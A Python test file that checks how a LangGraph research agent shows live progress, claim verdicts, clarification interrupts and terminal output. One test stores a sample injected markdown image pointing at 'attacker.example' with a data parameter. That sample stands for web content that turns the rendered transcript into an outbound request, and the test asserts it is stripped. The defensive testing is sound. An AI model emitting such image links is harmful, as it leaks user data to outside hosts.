"""Spec 12 acceptance: the run is visible while it happens.

Six criteria — the served graph loads without a compile-time checkpointer,
progress appears during retrieval rather than only at synthesis, every verdict
including the rejections is visible, clarification interrupts render and resume,
the terminal path works with no server, and no image markdown survives.

The one worth stating plainly is the third. Verification is a graph node, and a
node produces no message at all — so the step the whole design turns on is the
step that looks like nothing is happening. The bridge from `trace` to `messages`
is not decoration; without it the interface sits idle through the only part of
the run that distinguishes this agent from any other.

`asyncio.run` rather than pytest-asyncio, matching the rest of the suite.
"""
from __future__ import annotations

import asyncio
import json
from io import StringIO
from pathlib import Path

from langchain_core.messages import AIMessage, AIMessageChunk
from langgraph.types import Command, RetryPolicy
from rich.console import Console

from content_store import ContentStore
from graph import build_graph
from models import Models
from nodes.plan import Plan, TopicSpec
from nodes.research import ExtractedClaim, ExtractedQuote, Extraction
from nodes.sufficiency import Sufficiency
from progress import VERDICT_ICONS, describe, progress, with_progress
from search.base import SearchHit
from state import FAST, FULL, Budget, ev
from terminal import TerminalUI, stream_run
from verifiers import Verdict

PROJECT = Path(__file__).resolve().parent.parent

SOURCE_TEXT = (
    "Mimir scales to over 1 billion active series in a single cluster.\n\n"
    "It is deployed by large enterprises including several banks."
)
SCALES = "Mimir scales to over 1 billion active series"
URL = "https://grafana.com/mimir"


# --- fakes ------------------------------------------------------------------

class ScriptedLLM:
    model_name = "fake-model"

    def __init__(self, *, clarify=None, **replies):
        # `clarify` is (questions, assumption) for a run that should ask, or
        # None for one that shouldn't. None is the default because the tool loop
        # falls through on no tool call, so "does not ask" needs no script.
        self.clarify = clarify
        self.replies = {
            "Plan": Plan(brief="what a complete answer must cover",
                         topics=[TopicSpec(question=f"sub-question {i}", rationale="gap")
                                 for i in range(2)]),
            "Extraction": Extraction(claims=[ExtractedClaim(
                text="Mimir scales to over 1 billion active series.",
                quotes=[ExtractedQuote(text=SCALES)])]),
            "Sufficiency": Sufficiency(covered=[], gaps=[], new_topics=[],
                                       confidence=0.9, should_continue=False),
        } | replies

    def with_structured_output(self, schema):
        return _Bound(self, schema)

    def bind_tools(self, tools):
        return _ToolBound(self)

    def invoke(self, prompt, **kwargs):
        return AIMessage(content="Mimir scales [1].")


class _Bound:
    def __init__(self, llm, schema):
        self.llm, self.schema = llm, schema

    def invoke(self, prompt, **kwargs):
        return self.llm.replies[self.schema.__name__]

    async def ainvoke(self, prompt, **kwargs):
        return self.invoke(prompt)


class _ToolBound:
    """The clarify loop's half of `ScriptedLLM` (02).

    Asks once, then stops. Whether the tool has already answered is read off the
    message list rather than a counter, because the node re-executes from the
    top on resume — a counter would make the re-run script a second question.
    """

    def __init__(self, llm):
        self.llm = llm

    def invoke(self, msgs, **kwargs):
        answered = any(getattr(m, "type", None) == "tool" for m in msgs)
        if self.llm.clarify is None or answered:
            return AIMessage(content="The scope is clear enough to research.")

        questions, assumption = self.llm.clarify
        return AIMessage(content="", tool_calls=[{
            "name": "ask_user",
            "args": {"questions": list(questions),
                     "assumption_if_skipped": assumption},
            "id": "call0",
        }])

    async def ainvoke(self, msgs, **kwargs):
        return self.invoke(msgs)


class FakeVerifier:
    name = "fake:verifier"

    def __init__(self, verdict: str = "supported"):
        self._verdict = verdict

    async def check(self, claim: str, quote: str) -> Verdict:
        return Verdict(verdict=self._verdict, reason="the quote states it")


class FakeRouter:
    async def search(self, query: str, k: int = 5) -> list[SearchHit]:
        return [SearchHit(url=URL, title="Mimir", snippet="s",
                          content=SOURCE_TEXT, backend="test")]


FAST_RETRY = RetryPolicy(max_attempts=4, initial_interval=0.0,
                         backoff_factor=1.0, max_interval=0.0, jitter=False)
"""The production policy's shape with the waiting taken out. Tests need the
retry *behaviour*; sitting through ~26s of real backoff measures only sleep."""


def a_graph(*, llm=None, verifier=None, served=False, retry_policy=FAST_RETRY):
    return build_graph(router=FakeRouter(), store=ContentStore(),
                       models=Models.uniform(llm or ScriptedLLM()),
                       verifier=verifier or FakeVerifier(), served=served,
                       retry_policy=retry_policy)


def run_graph(graph, **state) -> dict:
    payload = {"question": "How far does Mimir scale?", "clarified": True,
               "budget": Budget(), **state}
    return asyncio.run(graph.ainvoke(payload, _config()))


def _config(thread: str = "test") -> dict:
    return {"configurable": {"thread_id": thread}}


def a_console() -> tuple[Console, StringIO]:
    buffer = StringIO()
    return Console(file=buffer, width=100, force_terminal=False, no_color=True), buffer


# --- the bridge: trace events become a transcript ---------------------------

def test_a_node_that_traced_nothing_says_nothing():
    """`add_messages` appends. A node with nothing to report must not push an
    empty bubble into the transcript."""
    assert progress([]) == []


def test_one_message_per_node_rather_than_one_per_event():
    """A message per fetch turns the transcript into a wall, so each node's
    events are batched into one block."""
    events = [ev("search", topic_id="t0", query=f"q{i}", n_results=3) for i in range(5)]

    messages = progress(events)

    assert len(messages) == 1
    assert messages[0].text.count("\n") == 4


def test_the_brief_reaches_the_transcript():
    (message,) = progress([ev("plan", brief="Cover scale and who runs it.",
                              topics=["how far", "who runs it"])])

    assert "Cover scale and who runs it." in message.text


def test_a_search_shows_the_query_and_what_it_found():
    assert "mimir scale" in describe(
        ev("search", topic_id="t0", query="mimir scale", n_results=4))


def test_a_supported_verdict_is_marked_as_one():
    line = describe(ev("verdict", claim_id="t0-c0", text="Mimir scales.",
                       verdict="supported", reason="stated", verified_by="v"))

    assert line.startswith(VERDICT_ICONS["supported"])
    assert "Mimir scales." in line


def test_a_rejected_verdict_carries_the_reason_it_failed():
    """Acceptance: every claim's verdict is visible, including the rejections.
    The rate at which claims fail is the health signal for the pipeline, and a
    rejection rendered the same as a pass hides it."""
    line = describe(ev("verdict", claim_id="t0-c0", text="Mimir scales to 1 million.",
                       verdict="unsupported", reason="the quote says 1 billion",
                       verified_by="v"))

    assert line.startswith(VERDICT_ICONS["unsupported"])
    assert "the quote says 1 billion" in line


def test_a_fabricated_quote_is_visible_rather_than_silently_dropped():
    """The most useful signal this pipeline produces. A quote that anchored
    nowhere has to be loud."""
    line = describe(ev("quote_not_found", claim="Mimir was discontinued.",
                       quote="Mimir was discontinued in 2019."))

    assert line.startswith(VERDICT_ICONS["quote_not_found"])
    assert "Mimir was discontinued" in line


def test_a_dropped_claim_says_why_it_was_dropped():
    line = describe(ev("claim_dropped", topic_id="t0", text="Mimir is fast.",
                       reason="no_anchored_quote"))

    assert "no_anchored_quote" in line


def test_the_report_event_says_what_the_report_was_built_from():
    assert "3" in describe(ev("report", n_supported=3, n_rejected=1))


def test_an_event_kind_nobody_taught_it_is_skipped_rather_than_crashing():
    """A new node's new event must not take the interface down. `trace` is the
    machine-readable channel and it grows; `messages` is a projection of the
    parts a human can use."""
    assert describe(ev("something_new", detail="whatever")) is None


def test_progress_strips_images_from_the_text_the_model_wrote():
    """Claim text and verdict reasons are model-written from untrusted pages,
    and Agent Chat UI renders markdown — so an injected
    `![](https://attacker/?d=)` in a claim is a live outbound GET the moment the
    transcript renders. Spec 08 strips the report; the transcript needs the same
    treatment for the same reason."""
    (message,) = progress([ev("verdict", claim_id="c0", verified_by="v",
                              text="Mimir scales ![](https://attacker.example/?d=x)",
                              verdict="supported", reason="stated")])

    assert "attacker.example" not in message.text


# --- the bridge is applied by the graph, not by each node -------------------

def test_a_wrapped_sync_node_still_returns_what_it_returned():
    wrapped = with_progress(lambda state: {"brief": "b", "trace": [ev("plan", brief="b",
                                                                     topics=[])]})

    out = wrapped({})

    assert out["brief"] == "b"
    assert len(out["messages"]) == 1


def test_a_wrapped_async_node_stays_async():
    async def node(state):
        return {"trace": [ev("search", topic_id="t", query="q", n_results=1)]}

    out = asyncio.run(with_progress(node)({}))

    assert len(out["messages"]) == 1


def test_a_wrapped_node_that_traced_nothing_gets_no_messages_key():
    """Writing an empty list to a channel with a reducer is still a write. The
    absence has to be an absence."""
    assert "messages" not in with_progress(lambda state: {"clarified": True})({})


def test_every_node_that_traces_something_projects_it_into_messages():
    """Acceptance, asserted structurally: the projection is applied by the graph
    to every node, so a node added later cannot forget it. That is the same
    reasoning as verification being a node — a convention each author must
    remember is not a guarantee."""
    async def collect() -> list[tuple[str, dict]]:
        return [(node, delta)
                async for chunk in a_graph().astream(
                    {"question": "How far does Mimir scale?", "clarified": True,
                     "budget": Budget()}, _config(), stream_mode="updates")
                for node, delta in chunk.items()]

    # A node whose update was empty — `assess` with clarification already
    # latched — arrives as None rather than as a dict. It traced nothing, so it
    # owes the interface nothing.
    traced = [(node, delta) for node, delta in asyncio.run(collect())
              if isinstance(delta, dict) and delta.get("trace")]

    assert traced, "the run produced no trace at all"
    for node, delta in traced:
        assert delta.get("messages"), f"{node} traced without telling the interface"


# --- acceptance: progress arrives during retrieval, not only at synthesis ---

def test_the_transcript_fills_up_before_the_report_is_written():
    """With no bridge the interface sits idle for the whole retrieval phase and
    then emits a report. The retrieval nodes have to speak first."""
    async def collect() -> list[str]:
        return [node
                async for chunk in a_graph().astream(
                    {"question": "How far does Mimir scale?", "clarified": True,
                     "budget": Budget()}, _config(), stream_mode="updates")
                for node, delta in chunk.items()
                if isinstance(delta, dict) and delta.get("messages")]

    spoke = asyncio.run(collect())

    assert spoke.index("research_topic") < spoke.index("synthesize")
    assert "verify" in spoke


def test_the_verdict_of_every_claim_reaches_the_transcript():
    """Acceptance, end to end: verification is a node and a node produces no
    message, so this is the step that would otherwise look like nothing
    happened."""
    out = run_graph(a_graph(verifier=FakeVerifier("unsupported")))

    transcript = "\n".join(m.text for m in out["messages"])
    assert transcript.count(VERDICT_ICONS["unsupported"]) == 2


# --- acceptance: the served graph loads without a compile-time checkpointer -

def test_a_served_graph_brings_no_checkpointer_of_its_own():
    """The server supplies persistence, and a compile-time checkpointer
    conflicts with it."""
    assert a_graph(served=True).checkpointer is None


def test_a_graph_that_is_not_served_still_gets_one():
    """`ask` interrupts, and an interrupt with nowhere to pause is an exception
    rather than a question. The eval harness (11) drives the graph with no
    server at all."""
    assert a_graph().checkpointer is not None


def test_langgraph_json_names_a_graph_that_can_actually_be_loaded():
    """Acceptance: `langgraph dev` starts and the graph loads. The server
    imports a module attribute, so the attribute has to be there — and it has to
    be importable without the provider keys the module itself will need."""
    config = json.loads((PROJECT / "langgraph.json").read_text())
    path, _, attribute = config["graphs"]["research"].partition(":")

    assert (PROJECT / path).exists()

    import app
    assert callable(getattr(app, attribute))


def test_langgraph_json_declares_the_local_package():
    config = json.loads((PROJECT / "langgraph.json").read_text())

    assert "." in config["dependencies"]


def test_the_served_graph_is_built_lazily_rather_than_at_import():
    """A module-level compiled graph would build models and a search router at
    import time — so importing it would need an API key, and every test that
    touched it would need one too."""
    import app

    assert not hasattr(app, "graph"), "a factory, not an eagerly built graph"


# --- acceptance: clarification interrupts render and resume -----------------

def test_a_clarification_interrupt_offers_the_questions_and_the_way_past_them():
    """Agent Chat UI renders the interrupt payload, so what it carries is what
    the human sees: the questions, and what the run will assume if they skip."""
    llm = ScriptedLLM(clarify=(["Which version?", "Which cloud?"],
                               "the latest release"))

    out = asyncio.run(a_graph(llm=llm).ainvoke(
        {"question": "How far does Mimir scale?", "budget": Budget()}, _config("ask")))

    (interrupt,) = out["__interrupt__"]
    assert interrupt.value["questions"] == ["Which version?", "Which cloud?"]
    assert interrupt.value["assumption_if_skipped"] == "the latest release"


def test_answering_the_interrupt_resumes_the_run_to_a_report():
    llm = ScriptedLLM(clarify=(["Which version?"], "the latest release"))
    graph = a_graph(llm=llm)
    config = _config("resume")

    asyncio.run(graph.ainvoke({"question": "How far does Mimir scale?",
                               "budget": Budget()}, config))
    out = asyncio.run(graph.ainvoke(Command(resume=["3.2"]), config))

    assert out["clarifications"] == [{"q": "Which version?", "a": "3.2"}]
    assert out["report"]


# --- acceptance: the terminal path works with no server ---------------------

def test_the_terminal_renders_a_run_with_no_server_anywhere():
    console, buffer = a_console()

    asyncio.run(stream_run(a_graph(), {"question": "How far does Mimir scale?",
                                       "clarified": True, "budget": Budget()},
                           _config("terminal"), ui=TerminalUI(console)))

    printed = buffer.getvalue()
    assert "sub-question 0" in printed
    assert VERDICT_ICONS["supported"] in printed


def test_the_terminal_marks_a_rejection_differently_from_a_pass():
    """Rendered distinctly on purpose in both interfaces: the rate at which
    claims fail verification is the pipeline's health signal, and a spike
    usually means a bad extraction prompt or a backend returning junk."""
    console, buffer = a_console()
    ui = TerminalUI(console)

    ui.emit(ev("verdict", claim_id="c0", text="a claim", verdict="unsupported",
               reason="the quote says otherwise", verified_by="v"))

    assert VERDICT_ICONS["unsupported"] in buffer.getvalue()


def test_the_terminal_survives_a_url_that_looks_like_markup():
    """Rich reads square brackets as style tags. A search result title is
    web-derived, so an unescaped one is a crash the agent hands itself."""
    console, buffer = a_console()

    TerminalUI(console).emit(ev("fetch", url="https://x.example/[bold]red[/]",
                                status="ok", chars=10))

    assert "[bold]red[/]" in buffer.getvalue()


def test_the_terminal_streams_report_tokens_as_they_arrive():
    console, buffer = a_console()
    ui = TerminalUI(console)

    ui.stream_token("Mimir ")
    ui.stream_token("scales [1].")

    assert buffer.getvalue().startswith("Mimir scales [1].")


def test_the_terminal_does_not_echo_the_progress_it_already_rendered():
    """The two halves of this spec collide: once nodes write `messages`, the
    `messages` stream carries the progress projection as well as report tokens —
    so a terminal reading both prints every line twice."""
    console, buffer = a_console()

    asyncio.run(stream_run(a_graph(), {"question": "How far does Mimir scale?",
                                       "clarified": True, "budget": Budget()},
                           _config("echo"), ui=TerminalUI(console)))

    assert buffer.getvalue().count("Coverage:") == 1


def test_the_terminal_streams_a_real_token_but_not_a_finished_message():
    """The distinction that separates them: a model streaming its answer yields
    chunks, a node writing to the transcript yields a whole message."""
    console, buffer = a_console()

    asyncio.run(stream_run(_StubGraph([
        ("messages", (AIMessage(content="already rendered"), {"langgraph_node": "verify"})),
        ("messages", (AIMessageChunk(content="a report token"),
                      {"langgraph_node": "synthesize"})),
    ]), {}, _config("stub"), ui=TerminalUI(console)))

    printed = buffer.getvalue()
    assert "a report token" in printed
    assert "already rendered" not in printed


def test_the_terminal_renders_only_the_synthesizers_tokens():
    """Every role streams, not just the synthesizer.

    `stream_mode="messages"` attaches a streaming callback handler, which makes
    langchain stream *every* model call — including the extractor's, whose
    structured output arrives as raw JSON. Both roles yield `AIMessageChunk`, so
    the chunk type cannot tell them apart; only `langgraph_node` can. Without
    that filter a real run interleaves schema JSON with the progress lines and
    the report becomes unreadable.
    """
    console, buffer = a_console()

    asyncio.run(stream_run(_StubGraph([
        ("messages", (AIMessageChunk(content='{"claims":[{"text":"'),
                      {"langgraph_node": "research_topic"})),
        ("messages", (AIMessageChunk(content="Mimir scales [1]."),
                      {"langgraph_node": "synthesize"})),
    ]), {}, _config("stub-roles"), ui=TerminalUI(console)))

    printed = buffer.getvalue()
    assert "Mimir scales [1]." in printed
    assert "claims" not in printed


def test_the_terminal_survives_a_chunk_that_carries_no_node_metadata():
    """Metadata is a dict the runtime fills in, and a surface that reads it with
    `[...]` crashes the whole render on the one chunk that arrives without it."""
    console, buffer = a_console()

    asyncio.run(stream_run(_StubGraph([
        ("messages", (AIMessageChunk(content="orphan"), {})),
    ]), {}, _config("stub-nometa"), ui=TerminalUI(console)))

    assert "orphan" not in buffer.getvalue()


class _StubGraph:
    """Yields exactly the two shapes the `messages` stream mixes together."""

    def __init__(self, chunks):
        self._chunks = chunks

    async def astream(self, payload, config, **kwargs):
        for chunk in self._chunks:
            yield chunk

    async def aget_state(self, config):
        from types import SimpleNamespace
        return SimpleNamespace(values={"report": "r"})


def test_the_terminal_returns_the_finished_state_so_the_caller_can_use_it():
    """The eval harness (11) drives the graph this way and needs the run, not
    the rendering."""
    out = asyncio.run(stream_run(
        a_graph(), {"question": "How far does Mimir scale?", "clarified": True,
                    "budget": Budget()}, _config("state"),
        ui=TerminalUI(a_console()[0])))

    assert out["report"]
    assert len(out["claims"]) == 2


# --- the fast profile -------------------------------------------------------

def test_the_fast_profile_turns_the_deepening_loop_off():
    """A full run is minutes. `max_rounds=1` means the sufficiency check (09)
    never even asks — the loop costs nothing when it is switched off."""
    assert FAST.max_rounds == 1


def test_the_fast_profile_is_cheaper_than_the_full_one_on_every_axis():
    assert FAST.max_topics < FULL.max_topics
    assert FAST.max_searches < FULL.max_searches
    assert FAST.max_fetches < FULL.max_fetches


def test_a_fast_run_researches_fewer_topics_than_it_was_offered():
    """The profile is a `Budget`, so it travels on the input payload — which is
    what a served graph needs, since the server cannot pass constructor
    arguments."""
    out = run_graph(a_graph(), budget=FAST.model_copy())

    assert len([t for t in out["topics"] if t.status == "researched"]) == 2


# --- what the curated channel gained ----------------------------------------

def test_the_search_line_names_the_backend_that_answered():
    line = describe(ev("search", topic_id="t0", query="mimir scale",
                       n_results=4, backend="tavily"))

    assert "tavily" in line
    assert "4" in line


def test_a_search_line_without_a_backend_still_renders():
    """`describe` must survive an event a node wrote before this field existed —
    a checkpointed run resumed after an upgrade carries exactly those."""
    line = describe(ev("search", topic_id="t0", query="mimir scale", n_results=0))

    assert "mimir scale" in line


def test_the_moment_the_agent_decides_to_ask_is_visible():
    """`clarify_asked` has always been traced and never rendered, so the one
    step that stops the run to wait on a human showed up on no surface."""
    line = describe(ev("clarify_asked", n=2))

    assert line is not None
    assert "2" in line
